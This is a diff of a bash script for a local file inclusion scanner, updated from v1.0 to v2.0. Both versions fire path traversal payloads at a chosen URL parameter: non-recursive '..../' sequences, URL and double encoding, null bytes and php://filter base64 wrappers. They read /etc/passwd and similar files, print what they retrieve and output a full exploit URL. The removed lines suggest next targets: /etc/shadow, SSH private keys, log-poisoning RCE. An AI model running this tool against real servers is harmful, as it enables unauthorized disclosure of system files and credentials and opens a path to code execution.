@@ -1,63 +1,68 @@
 #!/bin/bash
 
-# LFI Vulnerability Scanner with Iterative Bypass Testing
-# Usage: ./lfi_scanner.sh <URL> <PARAMETER>
-# Example: ./lfi_scanner.sh "http://example.com/index.php" "language"
+# Enhanced LFI Scanner v2.0
+# Now analyzes the URL to detect patterns
 
-# Color codes for output
+URL="$1"
+PARAM="$2"
+
+# Color codes
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
-# Check arguments
-if [ $# -lt 2 ]; then
-    echo -e "${RED}Usage: $0 <URL> <PARAMETER>${NC}"
-    echo "Example: $0 'http://example.com/index.php' 'language'"
-    exit 1
-fi
-
-URL="$1"
-PARAM="$2"
 TEMP_DIR="/tmp/lfi_scan_$$"
 mkdir -p "$TEMP_DIR"
 
-# Test files to try
-declare -a TEST_FILES=(
-    "etc/passwd"
-    "etc/hosts"
-    "etc/hostname"
-    "proc/version"
-    "windows/win.ini"
-)
-
 # Banner
 echo -e "${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
-echo -e "${BLUE}║         LFI Vulnerability Scanner v1.0                 ║${NC}"
-echo -e "${BLUE}║         Iterative Bypass Testing                       ║${NC}"
+echo -e "${BLUE}║         LFI Vulnerability Scanner v2.0                 ║${NC}"
+echo -e "${BLUE}║         Smart Pattern Detection                        ║${NC}"
 echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}"
 echo ""
-echo -e "${YELLOW}[*] Target URL: ${URL}${NC}"
-echo -e "${YELLOW}[*] Parameter: ${PARAM}${NC}"
+
+# Extract current parameter value to detect patterns
+echo -e "${YELLOW}[*] Analyzing URL for patterns...${NC}"
+
+# Parse the URL to get current parameter value
+if [[ "$URL" =~ $PARAM=([^&]+) ]]; then
+    CURRENT_VALUE="${BASH_REMATCH[1]}"
+    echo -e "${YELLOW}[*] Current parameter value: ${CURRENT_VALUE}${NC}"
+    
+    # Detect if there's a directory prefix
+    if [[ "$CURRENT_VALUE" =~ ^([^/]+/) ]]; then
+        PREFIX="${BASH_REMATCH[1]}"
+        echo -e "${YELLOW}[*] Detected prefix pattern: ${PREFIX}${NC}"
+    else
+        PREFIX=""
+        echo -e "${YELLOW}[*] No prefix detected${NC}"
+    fi
+else
+    PREFIX=""
+    echo -e "${YELLOW}[!] Could not parse current value${NC}"
+fi
+
 echo ""
 
-# Function to make request and save response
 make_request() {
     local payload="$1"
     local output_file="$2"
-    local full_url="${URL}?${PARAM}=${payload}"
+    local full_url
+    
+    # Remove existing parameter and add ours
+    base_url="${URL%%\?*}"
+    full_url="${base_url}?${PARAM}=${payload}"
     
     curl -s -L "$full_url" -o "$output_file" 2>/dev/null
     return $?
 }
 
-# Function to check if response contains success indicators
 check_success() {
     local file="$1"
     local target="$2"
     
-    # Check for common success indicators based on target file
     case "$target" in
         *"passwd"*)
             grep -q "root:.*:0:0:" "$file" && return 0
@@ -65,107 +70,75 @@ check_success() {
             ;;
         *"hosts"*)
             grep -q "127.0.0.1" "$file" && return 0
-            grep -q "localhost" "$file" && return 0
-            ;;
-        *"win.ini"*)
-            grep -q "\[fonts\]" "$file" && return 0
-            grep -q "\[extensions\]" "$file" && return 0
-            ;;
-        *"version"*)
-            grep -qi "linux" "$file" && return 0
-            grep -qi "kernel" "$file" && return 0
             ;;
     esac
     
     return 1
 }
 
-# Function to detect filter type from response
-detect_filter() {
-    local response_file="$1"
-    local payload="$2"
-    
-    # Check for error messages that reveal filter behavior
-    if grep -q "failed to open stream" "$response_file" 2>/dev/null; then
-        local path=$(grep -o "include([^)]*)" "$response_file" | head -1)
-        echo -e "${YELLOW}[!] Detected include() error: ${path}${NC}"
-        
-        # Check if ../ was stripped
-        if echo "$path" | grep -qv "\.\./"; then
-            echo -e "${YELLOW}[!] Filter detected: ../ strings are being removed${NC}"
-            return 1
-        fi
-        
-        # Check if .php was appended
-        if echo "$path" | grep -q "\.php"; then
-            echo -e "${YELLOW}[!] Filter detected: .php extension is being appended${NC}"
-            return 2
-        fi
-        
-        # Check if path was modified
-        if echo "$path" | grep -qv "$payload"; then
-            echo -e "${YELLOW}[!] Filter detected: Path is being modified${NC}"
-            return 3
-        fi
-    fi
-    
-    # Check for WAF/generic blocking
-    if grep -qi "illegal\|forbidden\|blocked\|invalid" "$response_file" 2>/dev/null; then
-        echo -e "${YELLOW}[!] Possible WAF/filter detected: Generic blocking message${NC}"
-        return 4
-    fi
-    
-    return 0
-}
-
 # Test basic LFI
 echo -e "${BLUE}[PHASE 1] Testing Basic LFI${NC}"
 echo "=========================================="
 
-basic_payload="../../../../etc/passwd"
-basic_output="${TEMP_DIR}/basic_test.html"
+basic_payloads=(
+    "../../../../etc/passwd"
+    "../../../../../etc/passwd"
+    "../../../../../../etc/passwd"
+    "../../../../../../../etc/passwd"
+)
 
-echo -e "${YELLOW}[*] Testing: ${basic_payload}${NC}"
-make_request "$basic_payload" "$basic_output"
+for payload in "${basic_payloads[@]}"; do
+    echo -e "${YELLOW}[*] Testing: ${payload}${NC}"
+    make_request "$payload" "${TEMP_DIR}/basic.html"
+    
+    if check_success "${TEMP_DIR}/basic.html" "passwd"; then
+        echo -e "${GREEN}[✓] SUCCESS! Basic LFI works${NC}"
+        echo -e "${GREEN}[✓] Working payload: ${payload}${NC}"
+        exit 0
+    fi
+done
 
-if check_success "$basic_output" "passwd"; then
-    echo -e "${GREEN}[✓] SUCCESS! Basic LFI works - No filter detected${NC}"
-    echo -e "${GREEN}[✓] Working payload: ${basic_payload}${NC}"
-    echo -e "${GREEN}[✓] Full URL: ${URL}?${PARAM}=${basic_payload}${NC}"
-    rm -rf "$TEMP_DIR"
-    exit 0
-else
-    echo -e "${RED}[✗] Basic LFI blocked or unsuccessful${NC}"
-    detect_filter "$basic_output" "$basic_payload"
-    filter_type=$?
-fi
-
+echo -e "${RED}[✗] Basic LFI unsuccessful${NC}"
 echo ""
 
-# Phase 2: Try bypass techniques
-echo -e "${BLUE}[PHASE 2] Testing Bypass Techniques${NC}"
+# Phase 2: Smart bypass with detected prefix
+echo -e "${BLUE}[PHASE 2] Testing Bypasses with Pattern Detection${NC}"
 echo "=========================================="
 
-# Define bypass payloads
-declare -a BYPASS_TECHNIQUES=(
-    "non_recursive:....//....//....//....//etc//passwd"
-    "non_recursive_alt:..././..././..././..././etc/passwd"
-    "non_recursive_backslash:....\/....\/....\/....\/etc/passwd"
-    "url_encoded:%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
-    "double_encoded:%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
-    "approved_path:./languages/../../../../etc/passwd"
-    "approved_path_bypass:./languages/....//....//....//....//etc//passwd"
-    "null_byte:../../../../etc/passwd%00"
-    "approved_null:./languages/../../../../etc/passwd%00"
-    "extra_slashes:..././..././..././..././etc/passwd"
-    "mixed_encoding:..%2f..%2f..%2f..%2fetc%2fpasswd"
-    "deep_traversal:../../../../../../../../../etc/passwd"
-)
+# Generate bypass payloads with multiple depths and prefix variations
+declare -a SMART_BYPASSES=()
+
+# Test depths from 3 to 8 traversals
+for depth in {3..8}; do
+    # Build traversal string
+    traversal=""
+    for ((i=1; i<=depth; i++)); do
+        traversal="${traversal}..../"
+    done
+    
+    # Try different combinations
+    if [ -n "$PREFIX" ]; then
+        # With detected prefix
+        SMART_BYPASSES+=("prefix_${depth}:${PREFIX}${traversal}/etc/passwd")
+        SMART_BYPASSES+=("prefix_dot_${depth}:./${PREFIX}${traversal}/etc/passwd")
+        
+        # Also try with // instead of /
+        traversal_double="${traversal//\//\/\/}"
+        SMART_BYPASSES+=("prefix_double_${depth}:${PREFIX}${traversal_double}etc//passwd")
+    fi
+    
+    # Without prefix
+    SMART_BYPASSES+=("no_prefix_${depth}:${traversal}/etc/passwd")
+    
+    # URL encoded versions
+    traversal_encoded=$(echo -n "$traversal" | sed 's/\.\./\%2e\%2e/g' | sed 's/\//\%2f/g')
+    SMART_BYPASSES+=("encoded_${depth}:${traversal_encoded}etc%2fpasswd")
+done
 
 success=0
 working_payload=""
 
-for technique in "${BYPASS_TECHNIQUES[@]}"; do
+for technique in "${SMART_BYPASSES[@]}"; do
     IFS=':' read -r name payload <<< "$technique"
     output_file="${TEMP_DIR}/${name}.html"
     
@@ -174,90 +147,85 @@ for technique in "${BYPASS_TECHNIQUES[@]}"; do
     
     make_request "$payload" "$output_file"
     
-    # Check for success
     if check_success "$output_file" "passwd"; then
         echo -e "${GREEN}[✓] SUCCESS with ${name}!${NC}"
         working_payload="$payload"
         success=1
+        
+        # Show the actual content
+        echo -e "${GREEN}[*] Retrieved content:${NC}"
+        grep -A 5 "root:" "$output_file" | head -10
+        
         break
-    else
-        echo -e "${RED}[✗] Failed${NC}"
     fi
-    
-    echo ""
 done
 
 echo ""
 
-# Phase 3: Try alternative files if passwd didn't work
+# Phase 3: Alternative files (only if still unsuccessful)
 if [ $success -eq 0 ]; then
-    echo -e "${BLUE}[PHASE 3] Testing Alternative Target Files${NC}"
+    echo -e "${BLUE}[PHASE 3] Testing Alternative Files${NC}"
     echo "=========================================="
-    echo -e "${YELLOW}[*] /etc/passwd might be specifically blocked. Trying alternatives...${NC}"
-    echo ""
     
-    for file in "${TEST_FILES[@]}"; do
-        # Skip passwd since we already tried it
-        if [[ "$file" == *"passwd"* ]]; then
-            continue
+    alt_files=("etc/hosts" "etc/hostname" "proc/version")
+    
+    for file in "${alt_files[@]}"; do
+        echo -e "${YELLOW}[*] Testing: /${file}${NC}"
+        
+        # Try with detected prefix if available
+        if [ -n "$PREFIX" ]; then
+            for depth in {3..6}; do
+                traversal=""
+                for ((i=1; i<=depth; i++)); do
+                    traversal="${traversal}..../"
+                done
+                
+                payload="${PREFIX}${traversal}/${file}"
+                make_request "$payload" "${TEMP_DIR}/alt_${file//\//_}.html"
+                
+                if check_success "${TEMP_DIR}/alt_${file//\//_}.html" "$file"; then
+                    echo -e "${GREEN}[✓] SUCCESS with /${file}!${NC}"
+                    working_payload="$payload"
+                    success=1
+                    break 2
+                fi
+            done
         fi
-        
-        echo -e "${YELLOW}[*] Testing file: /${file}${NC}"
-        
-        # Try multiple bypass techniques on this file
-        for technique in "${BYPASS_TECHNIQUES[@]}"; do
-            IFS=':' read -r name payload_template <<< "$technique"
-            
-            # Replace etc/passwd with current file
-            payload="${payload_template//etc\/passwd/$file}"
-            output_file="${TEMP_DIR}/${name}_${file//\//_}.html"
-            
-            make_request "$payload" "$output_file"
-            
-            if check_success "$output_file" "$file"; then
-                echo -e "${GREEN}[✓] SUCCESS! Found alternative file: /${file}${NC}"
-                echo -e "${GREEN}[✓] Working technique: ${name}${NC}"
-                echo -e "${GREEN}[✓] Payload: ${payload}${NC}"
-                working_payload="$payload"
-                success=1
-                break 2
-            fi
-        done
     done
 fi
 
 echo ""
 
-# Phase 4: Try PHP filters for source code disclosure
+# Phase 4: PHP Filters
 if [ $success -eq 0 ]; then
-    echo -e "${BLUE}[PHASE 4] Testing PHP Filter Wrappers${NC}"
+    echo -e "${BLUE}[PHASE 4] Testing PHP Filters${NC}"
     echo "=========================================="
-    echo -e "${YELLOW}[*] Trying to read PHP source code with base64 filter...${NC}"
-    echo ""
     
-    # Try to read index.php source
     php_payloads=(
         "php://filter/read=convert.base64-encode/resource=index"
         "php://filter/read=convert.base64-encode/resource=config"
-        "php://filter/read=convert.base64-encode/resource=../../../../var/www/html/index"
     )
     
+    if [ -n "$PREFIX" ]; then
+        # Extract just the directory part (remove trailing /)
+        dir_prefix="${PREFIX%/}"
+        php_payloads+=(
+            "php://filter/read=convert.base64-encode/resource=${dir_prefix}/en"
+            "php://filter/read=convert.base64-encode/resource=${dir_prefix}/es"
+        )
+    fi
+    
     for payload in "${php_payloads[@]}"; do
-        output_file="${TEMP_DIR}/php_filter.html"
         echo -e "${YELLOW}[*] Testing: ${payload}${NC}"
+        make_request "$payload" "${TEMP_DIR}/php_filter.html"
         
-        make_request "$payload" "$output_file"
-        
-        # Check if response contains base64 data
-        if grep -qE '[A-Za-z0-9+/]{50,}={0,2}' "$output_file"; then
-            # Try to decode and check if it's valid PHP
-            base64_content=$(grep -oE '[A-Za-z0-9+/]{50,}={0,2}' "$output_file" | head -1)
+        if grep -qE '[A-Za-z0-9+/]{50,}={0,2}' "${TEMP_DIR}/php_filter.html"; then
+            base64_content=$(grep -oE '[A-Za-z0-9+/]{50,}={0,2}' "${TEMP_DIR}/php_filter.html" | head -1)
             decoded=$(echo "$base64_content" | base64 -d 2>/dev/null)
             
             if echo "$decoded" | grep -q "<?php"; then
-                echo -e "${GREEN}[✓] SUCCESS! PHP source code disclosure possible${NC}"
-                echo -e "${GREEN}[✓] Working payload: ${payload}${NC}"
-                echo -e "${YELLOW}[*] Decoded content preview:${NC}"
+                echo -e "${GREEN}[✓] SUCCESS! PHP source disclosed${NC}"
+                echo -e "${YELLOW}Preview:${NC}"
                 echo "$decoded" | head -10
                 working_payload="$payload"
                 success=1
@@ -281,36 +249,29 @@ if [ $success -eq 1 ]; then
     echo -e "${GREEN}Working Payload:${NC}"
     echo -e "  ${working_payload}"
     echo ""
+    
+    # Build full URL
+    base_url="${URL%%\?*}"
+    full_exploit="${base_url}?${PARAM}=${working_payload}"
+    
     echo -e "${GREEN}Full Exploit URL:${NC}"
-    echo -e "  ${URL}?${PARAM}=${working_payload}"
+    echo -e "  ${full_exploit}"
     echo ""
-    echo -e "${YELLOW}Next Steps:${NC}"
-    echo "  1. Try reading sensitive files:"
-    echo "     - /etc/shadow (if running as root)"
-    echo "     - /var/www/html/config.php"
-    echo "     - /home/*/.ssh/id_rsa"
-    echo "  2. Try reading source code with PHP filters"
-    echo "  3. Attempt RCE via log poisoning or file upload"
-    echo "  4. Check for RFI if allow_url_include is enabled"
+    echo -e "${YELLOW}Test with curl:${NC}"
+    echo -e "  curl '${full_exploit}'"
+    echo ""
+    echo -e "${YELLOW}Detected Pattern:${NC}"
+    echo -e "  Prefix: ${PREFIX:-"none"}"
+    echo -e "  Traversal depth: $(echo "$working_payload" | grep -o '\.\.\.\./' | wc -l)"
 else
     echo -e "${RED}[✗✗✗] NO LFI VULNERABILITY DETECTED [✗✗✗]${NC}"
     echo ""
-    echo -e "${YELLOW}Possible reasons:${NC}"
-    echo "  1. Parameter is not vulnerable to LFI"
-    echo "  2. Strong filters are in place (try manual testing)"
-    echo "  3. WAF is blocking requests"
-    echo "  4. Application uses whitelist validation"
-    echo ""
-    echo -e "${YELLOW}Recommendations:${NC}"
-    echo "  1. Try manual testing with Burp Suite"
-    echo "  2. Fuzz with comprehensive LFI wordlists"
-    echo "  3. Check for other parameters that might be vulnerable"
-    echo "  4. Look for file upload + inclusion combinations"
+    echo -e "${YELLOW}Suggestions:${NC}"
+    echo "  1. Try manual testing with different depths"
+    echo "  2. Check if there are other parameters"
+    echo "  3. Use ZAP/Burp for interactive testing"
+    echo "  4. Try: curl '${URL%%\?*}?${PARAM}=languages/....//....//....//....//....//etc//passwd'"
 fi
 
-echo ""
-
-# Cleanup
 rm -rf "$TEMP_DIR"
-
 exit $([ $success -eq 1 ] && echo 0 || echo 1)
